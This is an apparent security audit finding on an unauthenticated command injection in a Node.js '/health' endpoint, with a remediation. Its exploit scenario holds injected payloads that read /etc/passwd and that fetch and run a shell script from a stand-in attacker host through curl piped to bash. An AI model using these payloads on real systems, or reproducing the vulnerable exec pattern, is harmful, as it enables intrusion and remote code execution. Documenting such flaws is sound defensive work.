## Security Findings

### Vuln 1: Command Injection (RCE) — `server/dist/index.js`

| Field | Detail |
|---|---|
| **Severity** | High |
| **Category** | `command_injection` |
| **Confidence** | 8/10 |
| **Authentication Required** | No — route is registered before auth middleware |

**Description:**  
The `/health` endpoint accepts a `service` query parameter that is directly concatenated into a shell command executed via Node.js `child_process.exec()`:

```javascript
const service = req.query.service || 'default';
child_process.exec('ping ' + service, (error, stdout) => {
  res.json({ status: ..., service: service, latency: ... });
});
```

No input validation or sanitization is applied. The route is publicly accessible (unauthenticated).

**Exploit Scenario:**  
An unauthenticated attacker sends:
```
GET /health?service=google.com%3Bcat%20/etc/passwd
```
This executes `ping google.com; cat /etc/passwd` on the server. More dangerous payloads (reverse shell, credential dump) are equally trivial:
```
GET /health?service=x%60curl+attacker.com/shell.sh|bash%60
```

**Recommendation:**  
Replace shell execution with a safe alternative. Use `execFile()` with a fixed command and allowlisted arguments, or implement the health check without invoking a shell (e.g., TCP probe via Node's `net` module):

```javascript
const ALLOWED_SERVICES = new Set(['api', 'db', 'cache']);
if (!ALLOWED_SERVICES.has(service)) {
  return res.status(400).json({ error: 'Invalid service' });
}
child_process.execFile('ping', ['-c', '1', serviceHostMap[service]], callback);
```
